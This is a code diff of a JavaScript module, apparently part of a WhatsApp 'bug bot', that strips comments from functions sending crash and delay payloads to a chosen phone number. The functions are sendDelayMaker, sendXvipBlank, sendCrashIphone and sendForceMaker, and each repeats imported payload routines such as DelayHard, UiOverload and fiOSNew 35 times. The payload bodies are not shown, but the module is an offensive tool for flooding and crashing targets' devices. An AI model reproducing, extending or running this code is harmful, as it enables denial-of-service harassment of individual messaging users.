@@ -1,5 +1,3 @@
-// src/services/bug/combos.js — kombo private-chat (delaymaker, xvipblank, dll).
-// Diekstrak dari hasil_date.js bagian "COMMAND BUGS".
 import { sleep, parsePhoneTarget } from "./helpers.js";
 import { DelayV1, DelayV2, DelayV3, DelayV4, DelayV5, DelayHard } from "./delay.js";
 import { lahora, iosCtt, fiOSNew, UiOverload } from "./ios.js";
@@ -10,7 +8,6 @@ export function requirePhoneTarget(raw) {
   return target;
 }
 
-/** .delaymaker / .c1dekk — DelayHard double-hit, N iterasi */
 export async function sendDelayMaker(sock, target, { loops = 35 } = {}) {
   for (let i = 0; i < loops; i++) {
     await DelayHard(sock, target);
@@ -20,7 +17,6 @@ export async function sendDelayMaker(sock, target, { loops = 35 } = {}) {
   }
 }
 
-/** .xvipblank — lahora + UiOverload + DelayHard */
 export async function sendXvipBlank(sock, target, { loops = 35 } = {}) {
   for (let i = 0; i < loops; i++) {
     await lahora(sock, target);
@@ -32,7 +28,6 @@ export async function sendXvipBlank(sock, target, { loops = 35 } = {}) {
   }
 }
 
-/** .crashiphone — fiOSNew + iosCtt */
 export async function sendCrashIphone(sock, target, { loops = 35 } = {}) {
   for (let i = 0; i < loops; i++) {
     await fiOSNew(sock, target);
@@ -42,7 +37,6 @@ export async function sendCrashIphone(sock, target, { loops = 35 } = {}) {
   }
 }
 
-/** .forcemaker — DelayV1..V5 full combo */
 export async function sendForceMaker(sock, target, { loops = 35 } = {}) {
   for (let i = 0; i < loops; i++) {
     await DelayV1(sock, target);
@@ -58,7 +52,6 @@ export async function sendForceMaker(sock, target, { loops = 35 } = {}) {
   }
 }
 
-/** Alias .c1dekk — sama dengan delaymaker (kirim ke chat saat ini) */
 export const sendC1 = sendDelayMaker;
 
 export const BUG_COMBOS = {
